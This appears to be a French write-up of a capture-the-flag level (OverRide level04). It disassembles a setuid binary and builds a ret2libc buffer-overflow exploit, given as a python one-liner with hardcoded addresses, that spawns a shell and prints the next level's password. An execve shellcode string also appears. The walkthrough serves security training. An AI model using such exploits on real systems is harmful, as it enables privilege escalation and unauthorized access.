## 1: Analyse

### A: C'est quoi mon binaire?

  ```shell
  # On se connecte si c'est pas déja fait via le level03
  $ ssh level04@127.0.0.1 -p 4242
        _____       _       ______    _ _
      |  __ \     (_)     |  ____|  | | |
      | |__) |__ _ _ _ __ | |__ __ _| | |
      |  _  /  _` | | '_ \|  __/ _` | | |
      | | \ \ (_| | | | | | | | (_| | | |
      |_|  \_\__,_|_|_| |_|_|  \__,_|_|_|

                    Good luck & Have fun

      To start, ssh with level0/level0 on 10.0.2.15:4242

  # On rentre le password
  level1@127.0.0.1's password: kgv3tkEb9h2mLkRsPkXRfc2mHbjMxQzvb2FrgKkf
  RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
  Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level04/level04
  level04@OverRide:~$
  
  # On regarde ce qu'on a
  level04@OverRide:~$ ls -la
    total 17
    dr-xr-x---+ 1 level04 level04   80 Sep 13  2016 .
    dr-x--x--x  1 root    root     260 Oct  2  2016 ..
    -rw-r--r--  1 level04 level04  220 Sep 10  2016 .bash_logout
    lrwxrwxrwx  1 root    root       7 Sep 13  2016 .bash_profile -> .bashrc
    -rw-r--r--  1 level04 level04 3533 Sep 10  2016 .bashrc
    -rwsr-s---+ 1 level05 users   7797 Sep 10  2016 level04
    -rw-r--r--+ 1 level04 level04   41 Oct 19  2016 .pass
    -rw-r--r--  1 level04 level04  675 Sep 10  2016 .profile

  # On teste les arguments
  level04@OverRide:~$ ./level04
    Give me some shellcode, k \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80
    child is exiting...
  ```
  * On a un binaire appartenant a level04 dans le home avec les droits SUID...
  * ... qui demande un shellcode ...
  * ... qui demande un input à l'infini si on met trop de caractères

### B: On l'ouvre avec gdb
  * On va dans tmp pour lancer avec peda qu'on a copié avec le setup.sh
  ```shell
    level04@RainFall:~$ cd /tmp
  ```

  * On lance gdb avec notre binaire
  ```shell
    level04@RainFall:/tmp$ gdb ~/level04
      [...]
      Reading symbols from /home/user/level04/level04...(no debugging symbols found)...done.
  ```

  * Qu'est-ce qu'on a comme fonctions?
  ```shell
    gdb-peda$ info function
      All defined functions:

      Non-debugging symbols:
      [...]
      0x08048634  clear_stdin
      0x08048657  get_unum
      0x0804868f  prog_timeout
      0x080486a0  enable_timeout_cons
      0x080486c8  main
      [...]
  ```

  * Commandes lancées pendant l'analyse du binaire ci-dessous
  ```shell
    gdb-peda$ x/s 0x8048903
      0x8048903:	 "Give me some shellcode, k"
    gdb-peda$ x/s 0x804891d
      0x804891d:	 "child is exiting..."
    gdb-peda$ x/s 0x8048931
      0x8048931:	 "no exec() for you"
  ```

  * On disassemble main pour regarder le code
  ```shell
    gdb-peda$ pdisas main
      Dump of assembler code for function main:
      # Initialisation, sauvegarde edi ebx, alignement, allocation 176 octets
      0x080486c8 <+0>:	push   ebp
      0x080486c9 <+1>:	mov    ebp,esp
      0x080486cb <+3>:	push   edi
      0x080486cc <+4>:	push   ebx
      0x080486cd <+5>:	and    esp,0xfffffff0
      0x080486d0 <+8>:	sub    esp,0xb0

      # pid = fork()
      0x080486d6 <+14>:	call   0x8048550 <fork@plt>
      0x080486db <+19>:	mov    DWORD PTR [esp+0xac],eax

      # memset(buffer[136], 0, 128)
      0x080486e2 <+26>:	lea    ebx,[esp+0x20]
      0x080486e6 <+30>:	mov    eax,0x0
      0x080486eb <+35>:	mov    edx,0x20
      0x080486f0 <+40>:	mov    edi,ebx
      0x080486f2 <+42>:	mov    ecx,edx
      0x080486f4 <+44>:	rep stos DWORD PTR es:[edi],eax

      # buffer[136] = '\0'
      0x080486f6 <+46>:	mov    DWORD PTR [esp+0xa8],0x0

      # number1 = '\0'
      0x08048701 <+57>:	mov    DWORD PTR [esp+0x1c],0x0

      # if pid 
      0x08048709 <+65>:	cmp    DWORD PTR [esp+0xac],0x0
      0x08048711 <+73>:	jne    0x8048769 <main+161>

      # prctl(1, 1) fais certaines opérations sur le process enfant
      0x08048713 <+75>:	mov    DWORD PTR [esp+0x4],0x1
      0x0804871b <+83>:	mov    DWORD PTR [esp],0x1
      0x08048722 <+90>:	call   0x8048540 <prctl@plt>

      # ptrace(0, 0, 0, 0)
      0x08048727 <+95>:	mov    DWORD PTR [esp+0xc],0x0
      0x0804872f <+103>:	mov    DWORD PTR [esp+0x8],0x0
      0x08048737 <+111>:	mov    DWORD PTR [esp+0x4],0x0
      0x0804873f <+119>:	mov    DWORD PTR [esp],0x0
      0x08048746 <+126>:	call   0x8048570 <ptrace@plt>

      # puts("Give me some shellcode, k")
      0x0804874b <+131>:	mov    DWORD PTR [esp],0x8048903
      0x08048752 <+138>:	call   0x8048500 <puts@plt>

      # gets(buffer), return
      0x08048757 <+143>:	lea    eax,[esp+0x20]
      0x0804875b <+147>:	mov    DWORD PTR [esp],eax
      0x0804875e <+150>:	call   0x80484b0 <gets@plt>
      0x08048763 <+155>:	jmp    0x804881a <main+338>

      # status = wait(&number1)
      0x08048768 <+160>:	nop
      0x08048769 <+161>:	lea    eax,[esp+0x1c]
      0x0804876d <+165>:	mov    DWORD PTR [esp],eax
      0x08048770 <+168>:	call   0x80484f0 <wait@plt>
      0x08048775 <+173>:	mov    eax,DWORD PTR [esp+0x1c]
      0x08048779 <+177>:	mov    DWORD PTR [esp+0xa0],eax

      # if status and 0x7f jump main+228
      0x08048780 <+184>:	mov    eax,DWORD PTR [esp+0xa0]
      0x08048787 <+191>:	and    eax,0x7f
      0x0804878a <+194>:	test   eax,eax
      0x0804878c <+196>:	je     0x80487ac <main+228>

      # if (status and 0x7f and 1) >> 1 <= 0 jump main+242 ...
      0x0804878e <+198>:	mov    eax,DWORD PTR [esp+0x1c] 
      0x08048792 <+202>:	mov    DWORD PTR [esp+0xa4],eax
      0x08048799 <+209>:	mov    eax,DWORD PTR [esp+0xa4]
      0x080487a0 <+216>:	and    eax,0x7f
      0x080487a3 <+219>:	add    eax,0x1
      0x080487a6 <+222>:	sar    al,1
      0x080487a8 <+224>:	test   al,al
      0x080487aa <+226>:	jle    0x80487ba <main+242>

      # ... else puts("child is exiting...") but child is not exited and return
      0x080487ac <+228>:	mov    DWORD PTR [esp],0x804891d
      0x080487b3 <+235>:	call   0x8048500 <puts@plt>
      0x080487b8 <+240>:	jmp    0x804881a <main+338>

      # ici status and 0x7f and 1 = true
      # ptrace(3, pid, 44, 0)
      0x080487ba <+242>:	mov    DWORD PTR [esp+0xc],0x0
      0x080487c2 <+250>:	mov    DWORD PTR [esp+0x8],0x2c
      0x080487ca <+258>:	mov    eax,DWORD PTR [esp+0xac]
      0x080487d1 <+265>:	mov    DWORD PTR [esp+0x4],eax
      0x080487d5 <+269>:	mov    DWORD PTR [esp],0x3
      0x080487dc <+276>:	call   0x8048570 <ptrace@plt>

      # buffer[136] = ret_ptrace
      0x080487e1 <+281>:	mov    DWORD PTR [esp+0xa8],eax

      # if ret_ptrace != 11 goto wait line
      0x080487e8 <+288>:	cmp    DWORD PTR [esp+0xa8],0xb
      0x080487f0 <+296>:	jne    0x8048768 <main+160>

      # puts("no exec() for you")
      0x080487f6 <+302>:	mov    DWORD PTR [esp],0x8048931
      0x080487fd <+309>:	call   0x8048500 <puts@plt>

      # kill(pid, 9)
      0x08048802 <+314>:	mov    DWORD PTR [esp+0x4],0x9
      0x0804880a <+322>:	mov    eax,DWORD PTR [esp+0xac]
      0x08048811 <+329>:	mov    DWORD PTR [esp],eax
      0x08048814 <+332>:	call   0x8048520 <kill@plt>
      0x08048819 <+337>:	nop

      # return 0
      0x0804881a <+338>:	mov    eax,0x0
      0x0804881f <+343>:	lea    esp,[ebp-0x8]
      0x08048822 <+346>:	pop    ebx
      0x08048823 <+347>:	pop    edi
      0x08048824 <+348>:	pop    ebp
      0x08048825 <+349>:	ret
      End of assembler dump.
  ```

## 2: Comportement
> Une fois recomposé, on comprend que le programme lance un subprocess.\
> Le subprocess va prendre un input avec gets (non protégé, buffer overfloooow).\
> Le parent va attendre que l'enfant aie terminé et return 0.


## 3: Exploit

### A: Explication

* On va tenter un buffer overflow de l'EIP l'enfant.
* On va avoir besoin pour ca d'une nouvelle gdb command.
* De plus, il y a un check sur execv: on ne pourra pas lancer un shellcode classique.
* On a donc 2 choix:
* ... prendre un shellcode qui ne fait pas d'execv et y accéder via une variable d'env
* ... rediriger vers la fonction de la libc system et lui passer la string "/bin/sh" (retour à la libc).\
* Vu qu'on n'a pas encore fait la deuxième c'est celle là qu'on va choisir.

### B: Creation de l'exploit

* Il nous faut donc: notre offset, l'addresse de system, l'addresse de la string "/bin/sh"

```shell
  # Commande pour suivre le process enfant
  gdb-peda$ set follow-fork-mode child

  # On génère le pattern
  gdb-peda$ pattern create 200 pattern04
    Writing pattern of 200 chars to filename "pattern04"
  gdb-peda$ cat pattern04
    AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA

  # On le met au moment de l'input
  gdb-peda$ run
    [New process 1735]
    Give me some shellcode, k
    AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA

    Program received signal SIGSEGV, Segmentation fault.
    [Switching to process 1735]
    [----------------------------------registers-----------------------------------]
    [...]
    EIP: 0x71414154 ('TAAq')
    [...]
    [-------------------------------------code-------------------------------------]
    Invalid $PC address: 0x71414154
    [------------------------------------stack-------------------------------------]
    [...]
    [------------------------------------------------------------------------------]
    Stopped reason: SIGSEGV
    0x71414154 in ?? ()

  # On search l'offset
  gdb-peda$ pattern search
    Registers contain pattern buffer:
    # offset
    [...]
    EIP+0 found at offset: 156
    [...]

  # On prend l'addresse de system
  gdb-peda$ p system
    $1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
  
  # On ne la trouve pas, on n'a qu'a la mettre dans l'environnement
  gdb-peda$ set environment SHELL_STRING=/bin/sh
  gdb-peda$ x/50s *((char **) environ)
    No symbol table is loaded.  Use the "file" command.

  # On ne peux pas print l'environ tant que le programme n'est pas lancé puisque la symbol table n'est pas encore load
  gdb-peda$ b fork
    Breakpoint 1 at 0x8048550
  gdb-peda$ run
    [...]
  gdb-peda$ x/50s *((char **) environ)
    [...]
    0xffffdf72:	 "SHELL_STRING=/bin/sh"
    [...]

  # On cherche l'addresse d'une string "/bin/sh" pendant le run
  gdb-peda$ find /bin/sh
    Searching for '/bin/sh' in: None ranges
    Found 2 results, display max 2 items:
      libc : 0xf7f897ec ("/bin/sh")
    [stack] : 0xffffdf7f ("/bin/sh")
```

* On a donc tous les prérequis. En transformant en little indian l'addresse de SHELL_STRING et de system, on va pouvoir construire la string suivante:
* \[A * 156][&system][OSEF][&"bin/sh"]0xf7e6aed0
* "A" * 156 + "\xd0\xae\xe6\xf7" + "OSEF" + "\x72\xdf\xff\xff"

```shell
  level04@RainFall:/tmp$
  (python -c 'print "A" * 156 + "\xd0\xae\xe6\xf7" + "OSEF" + "\xec\x97\xf8\xf7"'; cat - ) | ~/level04
    Give me some shellcode, k
  whoami
    level05
  cat /home/users/level05/.pass
    3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
    ^C
  level04@OverRide:/tmp$ su level05
    Password:
    RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
    No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level05/level05
  level05@OverRide:~$
```